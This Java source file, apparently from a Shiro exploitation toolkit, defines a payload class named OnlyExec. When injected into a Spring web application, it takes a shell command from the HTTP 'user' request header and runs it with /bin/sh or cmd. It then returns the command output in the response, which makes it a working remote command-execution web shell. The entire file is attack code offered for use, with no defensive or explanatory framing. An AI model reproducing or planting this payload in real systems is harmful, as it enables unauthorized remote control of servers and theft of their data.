package com.sma11new.exp.shiro.attack.shell;


import java.lang.reflect.Method;
import java.util.Scanner;

public class OnlyExec {
    public OnlyExec() {
        reflectInvoke();
    }

    public void defaultInvoke() {
        try {
            org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();
            javax.servlet.http.HttpServletRequest request = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();
            javax.servlet.http.HttpServletResponse response = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();
            // 请求头加一个 user 后面加命令
            String[] cmd = new String[]{"/bin/sh", "-c", request.getHeader("user")};
            byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\A").next().getBytes();
            response.setContentType("text/plain;charset=UTF-8");
            response.setCharacterEncoding("UTF-8");
            response.getWriter().write(new String(result));
            response.getWriter().flush();
            response.getWriter().close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void reflectInvoke() {
        try {
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            Class requestContextHolderClass = classLoader.loadClass("org.springframework.web.context.request.RequestContextHolder");
            Method getRequestAttributes = requestContextHolderClass.getMethod("getRequestAttributes");
            Object requestAttributesObject = getRequestAttributes.invoke(null);
            Class ServletRequestAttributesClass = classLoader.loadClass("org.springframework.web.context.request.ServletRequestAttributes");
            Method getResponse = ServletRequestAttributesClass.getMethod("getResponse");
            Method getRequest = ServletRequestAttributesClass.getMethod("getRequest");
            Object responseObject = getResponse.invoke(requestAttributesObject);
            Object requestObject = getRequest.invoke(requestAttributesObject);

            Method getWriter = classLoader.loadClass("javax.servlet.ServletResponse").getDeclaredMethod("getWriter");
            Method getHeader = classLoader.loadClass("javax.servlet.http.HttpServletRequest").getDeclaredMethod("getHeader", String.class);

            getHeader.setAccessible(true);
            getWriter.setAccessible(true);

            Method setContentType = classLoader.loadClass("javax.servlet.ServletResponse").getDeclaredMethod("setContentType", String.class);
            Method setCharacterEncoding = classLoader.loadClass("javax.servlet.ServletResponse").getDeclaredMethod("setCharacterEncoding", String.class);
            setContentType.setAccessible(true);
            setCharacterEncoding.setAccessible(true);

            setContentType.invoke(responseObject, "text/plain;charset=UTF-8");
            setCharacterEncoding.invoke(responseObject, "UTF-8");

            Object writerObject = getWriter.invoke(responseObject);
            String command = (String) getHeader.invoke(requestObject, "user");
            String[] commandArray = new String[3];
            if (System.getProperty("os.name").toUpperCase().contains("WIN")) {
                commandArray[0] = "cmd";
                commandArray[1] = "/c";
            } else {
                commandArray[0] = "/bin/sh";
                commandArray[1] = "-c";
            }
            commandArray[2] = command;
            writerObject.getClass().getDeclaredMethod("println", String.class).invoke(writerObject, (new Scanner(Runtime.getRuntime().exec(commandArray).getInputStream())).useDelimiter("\\A").next());
            writerObject.getClass().getDeclaredMethod("flush").invoke(writerObject);
            writerObject.getClass().getDeclaredMethod("clone").invoke(writerObject);
        } catch (Exception var11) {
            var11.getStackTrace();
        }
    }
}